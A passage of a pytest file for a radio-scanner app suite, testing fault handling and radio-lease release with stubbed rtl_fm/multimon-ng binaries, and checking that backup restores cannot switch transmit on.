        _fake(home, b, "cat >/dev/null; sleep 30" if b != "rtl_fm" else "sleep 30")
    _fake(home, dead, 'echo %s >> "%s"; exit 1' % (dead, marker))
    from palisade_qt import atlas, radio_arbiter as ra, sessionlog
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    src = atlas.AprsSource() if kind == "aprs" else atlas.AisSource()
    src.start()
    try:
        assert _until(lambda: (src.poll() is not None) and bool(src.given_back), 5000), src.given_back
        assert "FAULT" in src.given_back and ra.arbiter.owner() is None and lease.released
        assert any(it["level"] == "fault" and it["source"] == "ATLAS"
                   for it in sessionlog.log().snapshot())
    finally:
        src.stop()


def test_ra8d_atlas_layer_with_a_missing_decoder_never_holds_the_radio(monkeypatch, fakebin):
    home, marker = fakebin
    import shutil as _sh
    real = _sh.which
    monkeypatch.setattr(_sh, "which", lambda b, *a, **k: None if b == "multimon-ng" else real(b, *a, **k))
    from palisade_qt import atlas, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    src = atlas.AprsSource()
    src.start()
    try:
        assert _until(lambda: (src.poll() is not None) and bool(src.given_back), 3000)
        assert "no multimon-ng" in src.given_back and ra.arbiter.owner() is None
    finally:
        src.stop()


def test_ra8d_restore_never_switches_transmit_on(tmp_path, monkeypatch):
    """RA-CL8d NEW-Q: a backup could restore replay.json {tx_enabled: true, tx_region: EU}."""
    import tarfile
    import suite as S
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(S, "HOME", str(home))
    tx = tmp_path / "tx.json"
    tx.write_text('{"tx_enabled": true, "tx_region": "EU", "gain": 10}')
    ok = tmp_path / "ok.json"
    ok.write_text('{"freq": 101.5}')
    arc = str(tmp_path / "b.tar.gz")
    with tarfile.open(arc, "w:gz") as tf:
        tf.add(str(tx), arcname=".config/uconsole-suite/replay.json")
        tf.add(str(tx), arcname=".config/uconsole-suite/cw.json")
        tf.add(str(ok), arcname=".config/uconsole-suite/fm.json")
    names = S.restore_configs(arc)
    assert names == [".config/uconsole-suite/fm.json"]
    assert not (home / ".config/uconsole-suite/replay.json").exists()


def test_ra8d_prowl_enter_restarts_scan_after_a_fault(monkeypatch):
    from palisade_qt import prowl
    app = prowl.ProwlApp(demo=False)
    calls = []
    monkeypatch.setattr(app, "swap_worker", lambda: calls.append(1))

    class Done(prowl.ScanWorker):
        def isFinished(self):
            return True
    app._worker = Done(demo=False)
    app._active = True
    app._submode = "SCAN"
    monkeypatch.setattr(app, "swapping", lambda: False)
    assert app._resume_radio() is True and calls == [1]


# ================================================================== CL8-fix5 (RA-CL8e findings)
def test_ra8e_babel_sstv_rtl_fm_exiting_at_once_is_a_fault_and_gives_the_radio_back(monkeypatch, fakebin):
    """RA-CL8e NEW-T: SSTV respawned rtl_fm every second on a held radio, flipping to 'capturing'."""
    home, marker = fakebin
    _fake(home, "rtl_fm", 'echo rtl_fm >> "%s"; exit 1' % marker)
    from palisade_qt import babel, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = babel.SstvWorker(demo=False)
    faults, statuses = [], []
    w.fault.connect(faults.append)
    w.status.connect(statuses.append)
    w.set_running(True)
    w.start()
    try:
        assert _until(lambda: any("exits at once" in f for f in faults), 12000), statuses[-3:]
        assert _until(lambda: ra.arbiter.owner() is None, 3000) and lease.released
        n = marker.read_text().count("rtl_fm")
        time.sleep(2.5)
        _app().processEvents()
        assert marker.read_text().count("rtl_fm") == n and n <= 4, n
        assert not any(st.get("live") for st in statuses), "showed live while rtl_fm kept dying"
    finally:
        w.stop()
        assert w.wait(5000)


def test_ra8e_scan_am_rtl_fm_alive_but_silent_is_a_fault(monkeypatch, fakebin):
    """RA-CL8e NEW-S: on an AM bank rtl_fm always sends audio; silence means a dead dongle."""
    home, marker = fakebin
    _fake(home, "rtl_fm", 'echo rtl_fm >> "%s"; exec sleep 1000' % marker)
    from palisade_qt import prowl, radio_arbiter as ra
    lease = _Lease()
    monkeypatch.setattr(ra, "_make_lease", lease.make)
    w = prowl.ScanWorker(demo=False, bank="Airband")
    faults = []
    w.fault.connect(faults.append)
    w.set_active(True)
    w.start()
    try:
        assert _until(lambda: any("exits at once" in f or "SDR" in f for f in faults), 20000), faults
        assert _until(lambda: ra.arbiter.owner() is None, 3000)
    finally:
        w.stop()
        assert w.wait(6000)


def test_ra8e_restore_tx_check_cannot_be_padded_past(tmp_path, monkeypatch):
    import tarfile
    import suite as S
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(S, "HOME", str(home))
    pad = tmp_path / "pad.json"
    pad.write_text('{"tx_enabled": true, "tx_region": "EU"' + " " * (1 << 20) + "}")
    broken = tmp_path / "broken.json"
    broken.write_text('{"TX_ENABLED": true,')
    arc = str(tmp_path / "b.tar.gz")
    with tarfile.open(arc, "w:gz") as tf:
        tf.add(str(pad), arcname=".config/uconsole-suite/replay.json")
        tf.add(str(broken), arcname=".config/uconsole-suite/cw.json")
    assert S.restore_configs(arc) == []


def test_ra8f_restore_tx_check_matches_keys_not_labels(tmp_path, monkeypatch):
    import tarfile
    import suite as S
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(S, "HOME", str(home))
    f = tmp_path / "s.json"
    f.write_text('{"custom": ["118.300 ATX_TOWER am"], "label": "tx_note"}')
    arc = str(tmp_path / "b.tar.gz")
    with tarfile.open(arc, "w:gz") as tf:
        tf.add(str(f), arcname=".config/uconsole-suite/scanner.json")
    assert S.restore_configs(arc) == [".config/uconsole-suite/scanner.json"]
